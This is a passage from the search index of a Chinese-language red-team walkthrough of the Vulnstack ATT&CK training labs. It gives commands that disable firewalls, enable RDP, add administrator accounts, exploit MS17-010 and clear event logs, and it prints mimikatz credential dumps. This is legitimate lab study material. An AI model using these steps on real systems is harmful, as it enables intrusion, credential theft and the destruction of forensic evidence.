kiwi</code>\u6a21\u5757\uff0c<code>creds_all</code>\u5bfc\u51fa\u660e\u6587\u5bc6\u7801<code>hongrisec@2019</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_26","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#33893389","title":"\u67e5\u770b3389\u5f00\u653e\u60c5\u51b5\uff0c\u5e76\u5c1d\u8bd5\u6253\u5f003389,\u5173\u95ed\u9632\u706b\u5899\uff0c\u8fde\u63a5\u8fdc\u7a0b\u684c\u9762","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#netstat-an-findstr-3389","title":"<code>netstat -an | findstr \u201c3389\u201d</code>\u67e5\u770b\u8fdc\u7a0b\u7aef\u53e3","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_27","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-00000000-f","title":"\u5f00\u542f3389<code>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#3389reg-add-hklmsystemcurrentcontrolsetcontrolterminal-server-v-fdenytsconnections-t-reg_dword-d-11111111-f","title":"\u5173\u95ed3389<code>REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u201d \"Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f\uff09</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_28","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_29","title":"\u5173\u95ed\u9632\u706b\u5899\uff1a","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#windows-server-2003-netsh-firewall-set-opmode-disable","title":"Windows Server 2003 \u7cfb\u7edf\u53ca\u4e4b\u524d\u7248\u672c<code>netsh firewall set opmode disable</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#windows-server-2003-netsh-advfirewall-set-allprofiles-state-off","title":"Windows Server 2003 \u4e4b\u540e\u7cfb\u7edf\u7248\u672c<code>netsh advfirewall set allprofiles state off</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_30","title":"\u6216\u8005","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#3389-netsh-advfirewall-firewall-add-rule-nameremote-desktop-protocoltcp-dirin-localport3389-actionallow","title":"\u5141\u8bb8 3389 \u7aef\u53e3\u653e\u884c<code>netsh advfirewall firewall add rule name=\u201cRemote Desktop\u201d protocol=TCP dir=in localport=3389 action=allow</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_31","title":"","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_32","title":"\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u5907\u7528\u5565\u7684","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#net-user-username-password-add","title":"<code>net user [username] [password] /add</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#administrators","title":"\u6dfb\u52a0\u5230Administrators\u7528\u6237\u7ec4","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#net-localgroup-administrators-username-add","title":"<code>net localgroup Administrators [username] /add</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_33","title":"\u6fc0\u6d3b\u7528\u6237","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#net-user-username-activeyes","title":"<code>net user [username] /active:yes</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_34","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_35","title":"\u642d\u5efa\u4ee3\u7406\u2013\u6a2a\u5411\u6e17\u900f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#win719216852c","title":"\u7531\u4e8e\u5df2\u7ecf\u53d1\u73b0win7\u5b58\u5728\u5185\u7f51<code>192.168.52</code>\u7684c\u6bb5\uff0c\u642d\u5efa\u4ee3\u7406\u901a\u9053","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_36","title":"\u9996\u5148\u6dfb\u52a0\u8def\u7531,\u5e76\u5c06\u4f1a\u8bdd\u5207\u81f3\u540e\u53f0","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_37","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#socks","title":"\u8bbe\u7f6esocks\u4ee3\u7406","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_38","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#proxychainsmsfsocksetcproxychains4conf","title":"\u518d\u8bbe\u7f6eproxychains\u4ee3\u7406\u914d\u7f6e\u4e3amsf\u7684socks\u4ee3\u7406\u7aef\u53e3<code>/etc/proxychains4.conf</code>","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_39","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#52","title":"\u63a2\u6d4b52\u7f51\u6bb5\u4e3b\u673a\u5b58\u6d3b","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_40","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3001","text":"<p>\u9996\u5148\u5148<code>win2003</code>\u2013<code>192.168.52.141</code></p> <p>\u4f7f\u7528<code>use auxiliary/scanner/portscan/tcp</code>\u5bf9<code>192.168.52.141</code>\u8fdb\u884c\u7aef\u53e3\u626b\u63cf</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u5f00\u542f\u4e86445\u7aef\u53e3\uff0c\u63a2\u6d4b\u4e0bsamba\u670d\u52a1<code>use auxiliary/scanner/smb/smb_version</code></p> <p></p> <p>\u6d4b\u8bd5smb\u76f8\u5173\u7684\u6f0f\u6d1e</p> <p><code>use auxiliary/admin/smb/ms17_010_command</code></p> <p></p> <p>\u8bbe\u7f6e\u547d\u4ee4\u2013&gt;\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u5e76\u8bbe\u7f6e\u7ba1\u7406\u5458\u6743\u9650\uff0c\u7136\u540e\u5f00\u542f3389\u7aef\u53e3</p> <p><code>set command \"net user hack #hack123@ /add\" \u521b\u5efa\u7528\u6237</code></p> <p><code>set command \"net localgroup Administrators hack /add\"</code></p> <p><code>set command \u2018REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u2019 \u6253\u5f003389\u7aef\u53e3</code></p> <p><code>set command \"netsh firewall set opmode mode=disable\" \u5173\u95ed\u9632\u706b\u5899</code></p> <p></p>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B001/#_41","title":"\u62ff\u4e0b\u57df\u63a7\u6743\u9650","text":"<p>\u626b\u63cf\u57df\u63a7\u7aef\u53e3</p> <p> </p> <p>\u53d1\u73b0smb\u670d\u52a1\uff0c\u5c1d\u8bd5\u5229\u7528smb\u6f0f\u6d1e</p> <p><code>use exploit/windows/smb/ms17_010_psexec</code>\u672a\u6210\u529f</p> <p>\u7528<code>use auxiliary/admin/smb/ms17_010_command</code>\u6dfb\u52a0\u7528\u6237\u5e76\u5f00\u542f3389\u7136\u540e\u8fde\u63a5</p> <pre><code>set command \"net user hack #hack123@ /add\" \u521b\u5efa\u7528\u6237\n\nset command  \"net localgroup Administrators hack /add\" \n\nset command \u2018REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u2019 \u6253\u5f003389\u7aef\u53e3\n\nset command  \"netsh firewall set opmode mode=disable\"  \u5173\u95ed\u9632\u706b\u5899\n</code></pre> <p>\u8fd9\u662f\u6e05\u7406\u75d5\u8ff9\u7684\u4e00\u4e9b\u53c2\u8003\u65b9\u6cd5</p> <pre><code>\u6709\u8fdc\u7a0b\u684c\u9762\u6743\u9650\u65f6\u624b\u52a8\u5220\u9664\u65e5\u5fd7\uff1a\n\u5f00\u59cb-\u7a0b\u5e8f-\u7ba1\u7406\u5de5\u5177-\u8ba1\u7b97\u673a\u7ba1\u7406-\u7cfb\u7edf\u5de5\u5177-\u4e8b\u4ef6\u67e5\u770b\u5668-\u6e05\u9664\u65e5\u5fd7\n\nwevtutil\uff1a\n    wevtutil el \u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u65e5\u5fd7\u540d\u79f0\n    wevtutil cl system \u6e05\u7406\u7cfb\u7edf\u65e5\u5fd7\n    wevtutil cl application \u6e05\u7406\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\n    wevtutil cl security \u6e05\u7406\u5b89\u5168\u65e5\u5fd7\n\nmeterperter\u81ea\u5e26\u6e05\u9664\u65e5\u5fd7\u529f\u80fd\uff1a\nclearev \u6e05\u9664windows\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\u3001\u5b89\u5168\u65e5\u5fd7\n\n\u6e05\u9664recent\uff1a\n\u5728\u6587\u4ef6\u8d44\u6e90\u7ba1\u7406\u5668\u4e2d\u70b9\u51fb \"\u67e5\u770b\" -&gt; \"\u9009\u9879\" -&gt;\u5728\u5e38\u89c4-&gt;\u9690\u79c1\u4e2d\u70b9\u51fb\" \u6e05\u9664\" \u6309\u94ae\n\u6216\u76f4\u63a5\u6253\u5f00C:\\Users\\Administrator\\Recent\u5e76\u5220\u9664\u6240\u6709\u5185\u5bb9\n\u6216\u5728\u547d\u4ee4\u884c\u4e2d\u8f93\u5165del /f /s /q  \"%userprofile%\\Recent*.*\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/","title":"ATTCK\u7ea2\u961f\u8bc4\u4f3002","text":"<p>\u62d3\u6251\u73af\u5883\u5982\u4e0b\uff1a</p> <p></p> <p>http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</p>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_1","title":"\u73af\u5883\u8bf4\u660e","text":"<p><code>\u5185\u7f51\u7f51\u6bb5\uff1a10.10.10.1/24</code></p> <p><code>DMZ\u7f51\u6bb5\uff1a192.168.111.1/24</code></p> <p><code>\u6d4b\u8bd5\u673a\u5730\u5740\uff1a192.168.111.1\uff08Windows\uff09\uff0c192.168.111.11\uff08Linux\uff09</code></p> <p><code>\u9632\u706b\u5899\u7b56\u7565\uff08\u7b56\u7565\u8bbe\u7f6e\u8fc7\u540e\uff0c\u6d4b\u8bd5\u673a\u53ea\u80fd\u8bbf\u95ee192\u6bb5\u5730\u5740\uff0c\u6a21\u62df\u516c\u7f51\u8bbf\u95ee\uff09\uff1a</code></p> <pre><code>`deny all tcp ports\uff1a10.10.10.1\nallow all tcp ports\uff1a10.10.10.0/24`\n`PS\uff1a\u9ed8\u8ba4\u5f00\u673a\u5bc6\u7801\uff1a1qaz@WSX\uff0cWEB \u673a\u5bc6\u7801\u9ed8\u8ba4\u9519\u8bef\uff0c\u9700\u8981\u5148\u666e\u901a\u7528\u6237\u767b\u5f55 de1ay/1qaz@WSX\uff0c\u8fdb\u5165\u540e\u7136\u540e\u4f7f\u7528\u7ba1\u7406\u5458\u8d26\u6237\u63d0\u6743\uff0cweb \u673a\u9700\u8981\u624b\u52a8\u5728 C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain \u4e0b\u7684 startweblogic.bat \u7ba1\u7406\u5458\u6743\u9650\u5f00\u542f`\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_2","title":"\u914d\u7f6e\u4fe1\u606f","text":"<p>DC</p> <p><code>IP\uff1a10.10.10.10</code></p> <p><code>OS\uff1aWindows 2012(64)</code></p> <p><code>\u5e94\u7528\uff1aAD\u57df</code></p> <p>WEB</p> <p><code>IP1\uff1a10.10.10.80</code></p> <p><code>IP2\uff1a192.168.111.80</code></p> <p><code>OS\uff1aWindows 2008(64)</code></p> <p><code>\u5e94\u7528\uff1aWeblogic 10.3.6\u00a0 \u00a0 MSSQL 2008</code></p> <p>PC</p> <p><code>IP1\uff1a10.10.10.201</code></p> <p><code>IP2\uff1a192.168.111.201</code></p> <p><code>OS\uff1aWindows 7(32)</code></p> <p>\u653b\u51fb\u673a</p> <p><code>IP\uff1a192.168.111.30</code></p> <p><code>OS\uff1aKali</code></p>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_3","title":"\u4e3b\u673a\u53d1\u73b0","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#nmap","title":"\u4f7f\u7528nmap\u626b\u63cf\u7f51\u6bb5","text":"<pre><code>\u2514\u2500$ sudo nmap -sS -Pn -T4 192.168.111.0/24\n[sudo] password for kali: \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 04:55 EDT\nNmap scan report for 192.168.111.1\nHost is up (0.027s latency).\nNot shown: 999 filtered tcp ports (no-response)\nPORT   STATE  SERVICE\n80/tcp closed http\nMAC Address: 00:50:56:C0:00:03 (VMware)\n\nNmap scan report for 192.168.111.80\nHost is up (0.0052s latency).\nNot shown: 988 closed tcp ports (reset)\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n1433/tcp  open  ms-sql-s\n3389/tcp  open  ms-wbt-server\n7001/tcp  open  afs3-callback\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49160/tcp open  unknown\nMAC Address: 00:0C:29:2A:EE:99 (VMware)\n\nNmap scan report for 192.168.111.201\nHost is up (0.026s latency).\nNot shown: 992 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n3389/tcp  open  ms-wbt-server\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\nMAC Address: 00:0C:29:85:D1:4D (VMware)\n\nNmap scan report for 192.168.111.30\nHost is up (0.0034s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT     STATE SERVICE\n6789/tcp open  ibm-db2-admin\n\nNmap done: 256 IP addresses (4 hosts up) scanned in 111.65 seconds\n</code></pre>"},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#19216811180807001weblogic","title":"\u8bbf\u95ee192.168.111.80\u768480\u7aef\u53e3\u53d1\u73b0\u662f\u7a7a\u767d\u9875\u9762\uff0c\u8bbf\u95ee7001\u7aef\u53e3\u53d1\u73b0\u662fweblogic,\u4f7f\u7528\u5de5\u5177\u68c0\u6d4b\u76f8\u5173\u6f0f\u6d1e\uff1a","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#cve_2016_0638","title":"\u53d1\u73b0\u5b58\u5728cve_2016_0638\uff08\u5176\u5b9e\u8fd8\u6709\u597d\u51e0\u4e2a\uff0c\u5de5\u5177\u6bd4\u8f83\u8001\u5176\u4ed6\u7684\u6ca1\u68c0\u6d4b\u51fa\u6765\uff09","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_4","title":"\u5199\u5165\u51b0\u874e\u5185\u5b58\u9a6c\uff0c\u5e76\u6210\u529f\u8fde\u63a5","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#_5","title":"\u5185\u7f51\u6e17\u900f","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#csshell","title":"cs\u5f00\u542f\u76d1\u542c\uff0c\u5e76\u5236\u4f5c\u6728\u9a6c\uff0c\u901a\u8fc7\u51b0\u874e\u8fdb\u884c\u4e0a\u4f20\uff0c\u6210\u529f\u83b7\u53d6\u5230shell","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#dc","title":"\u4e0a\u7ebf\u57df\u63a7DC","text":""},{"location":"web/ATTCK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B002/#mimikatz-dump-hash","title":"\u52a0\u8f7dmimikatz dump hash\u548c\u5bc6\u7801","text":"<pre><code>beacon&gt; hashdump\n[*] Tasked beacon to dump hashes\n[+] host called home, sent: 82541 bytes\n[+] received password hashes:\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:45a524862326cb9e7d85af4017a000f0:::\nde1ay:1000:aad3b435b51404eeaad3b435b51404ee:3b24c391862f4a8531a245a0217708c4:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n</code></pre> <pre><code>beacon&gt; logonpasswords\n[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command\n[+] host called home, sent: 297594 bytes\n[+] received output:\n\nAuthentication Id : 0 ; 4446154 (00000000:0043d7ca)\nSession           : RemoteInteractive from 1\nUser Name         : Administrator\nDomain            : WEB\nLogon Server      : WEB\nLogon Time        : 2025/8/21 16:51:31\nSID               : S-1-5-21-3767205380-3469466069-2137393323-500\n    msv :   \n     [00000003] Primary\n     * Username : Administrator\n     * Domain   : WEB\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 45a524862326cb9e7d85af4017a000f0\n     * SHA1     : 9de837c08728a5a6bef9e4721964b15ca3ffd969\n    tspkg : \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    wdigest :   \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    kerberos :  \n     * Username : Administrator\n     * Domain   : WEB\n     * Password : 1qaz@wsx\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 4027902 (00000000:003d75fe)\nSession           : CachedInteractive from 2\nUser Name         : Administrator\nDomain            : DE1AY\nLogon Server      : DC\nLogon Time        : 2025/8/20 20:46:24\nSID               : S-1-5-21-2756371121-2868759905-3853650604-500\n    msv :   \n     [00000003] Primary\n     * Username : Administrator\n     * Domain   : DE1AY\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 161cff084477fe596a5db81874498a24\n     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d\n    tspkg : \n     * Username : Administrator\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    wdigest :   \n     * Username : Administrator\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    kerberos :  \n     * Username : Administrator\n     * Domain   : de1ay.com\n     * Password : 1qaz@WSX\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 2183568 (00000000:00215190)\nSession           : Service from 0\nUser Name         : DefaultAppPool\nDomain            : IIS APPPOOL\nLogon Server      : (null)\nLogon Time        : 2025/8/20 20:16:12\nSID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415\n    msv :   \n     [00000003] Primary\n     * Username : WEB$\n     * Domain   : DE1AY\n     * NTLM     : 799225af512d82db605e224b29622bca\n     * SHA1     : a78068681c26bd5f83c9ad0a0f0b991803dc4840\n    tspkg : \n     * Username : WEB$\n     * Domain   : DE1AY\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    wdigest :   \n     * Username : WEB$\n     * Domain   : DE1AY\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    kerberos :  \n     * Username : WEB$\n     * Domain   : de1ay.com\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 1416116 (00000000:00159bb4)\nSession           : Interactive from 2\nUser Name         : de1ay\nDomain            : DE1AY\nLogon Server      : DC\nLogon Time        : 2025/8/20 20:10:41\nSID               : S-1-5-21-2756371121-2868759905-3853650604-1001\n    msv :   \n     [00000003] Primary\n     * Username : de1ay\n     * Domain   : DE1AY\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 161cff084477fe596a5db81874498a24\n     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d\n    tspkg : \n     * Username : de1ay\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    wdigest :   \n     * Username : de1ay\n     * Domain   : DE1AY\n     * Password : 1qaz@WSX\n    kerberos :  \n     * Username : de1ay\n     * Domain   : DE1AY.COM\n     * Password : 1qaz@WSX\n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 996 (00000000:000003e4)\nSession           : Service from 0\nUser Name         : WEB$\nDomain            : DE1AY\nLogon Server      : (null)\nLogon Time        : 2025/8/20 20:07:14\nSID               : S-1-5-20\n    msv :   \n     [00000003] Primary\n     * Username : WEB$\n     * Domain   : DE1AY\n     * NTLM     : 799225af512d82db605e224b29622bca\n     * SHA1     : a78068681c26bd5f83c9ad0a0f0b991803dc4840\n    tspkg : \n    wdigest :   \n     * Username : WEB$\n     * Domain   : DE1AY\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    kerberos :  \n     * Username : web$\n     * Domain   : DE1AY.COM\n     * Password : dc ce 7a 45 0f 60 c2 0d 04 79 3c fc 41 cd 8e 7b 90 e1 fc cf e0 8b 97 f8 27 0d 30 cc 3a bf 9a c6 e0 82 b3 e1 2b 45 8d 85 09 51 4c c6 2e 2a ef b4 72 3d 9c 43 44 ea 5d 03 0a 22 e6 41 e2 ea 0c 53 ef ce 36 1a 11 bf d3 78 3d 47 e5 79 d0 4f 43 7b 19 0b ca 06 b7 f4 d3 4f 69 95 2a d5 04 38 b6 82 9b a8 e2 14 3f 48 b8 d3 b2 f0 45 98 00 fb 47 2f 67 9e c3 04 03 d7 c1 1d ef e6 a6 7f 9a 0e 2f 11 ad 49 ea f6 73 82 1d 91 52 da e2 85 b6 48 dd 9a 09 67 34 3f 41 5d 75 83 ae ce 25 20 35 25 24 72 94 c1 9b d4 84 6d d8 ba 3b 61 83 20 ad 74 70 3a ce 73 f4 2a 32 d4 ad 7e 8d 84 54 f3 92 c8 b1 11 26 c1 da 0e 0d 6b e0 70 bd e0 f2 03 0a 88 1b 05 4b a9 3c be 47 66 eb dc 1a 7b c5 ea 38 0a 04 a6 50 ff 9e 36 86 e8 9a dd 93 ed b8 30 84 a3 31 39 \n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 50044 (00000000:0000c37c)\nSession           : UndefinedLogonType from 0\nUser Name         : (null)\nDomain            : (null)\nLogon Server      : (null)\nLogon Time        : 2025/8/20 20:07:13\nSID               : \n    msv :   \n     [00000003] Primary\n     * Username : WEB$\n     * Domain   : DE1AY\n     * NTLM     : 799225af512d82db605e224b29622bca\n     * SHA1     : a78068681c26bd5f83c9ad0a0f0b991803dc4840\n    tspkg : \n    wdigest :   \n    kerberos :  \n    ssp :   \n    credman :   \n\nAuthentication Id : 0 ; 3801879 (00000000:003a0317)\nSession           : CachedInteractive from 2\nUser Name         : Administrator\nDomain            : DE1AY\nLogon Server      : DC\nLogon Time        : 2025/8/20 20:41:18\nSID               : S-1-5-21-2756371121-2868759905-3853650604-500\n    msv :   \n     [00000003] Primary\n     * Username : Administrator\n     * Domain   : DE1AY\n     * LM       : f67ce55ac831223dc187b8085fe1d9df\n     * NTLM     : 161cff084477fe596a5db81874498a24\n     * SHA1     : d669f3bccf14bf77d64667ec65aae32d2d10039d\n    tspkg : \n     * Username : Administrator\n     * Domain   : DE1AY\n     * 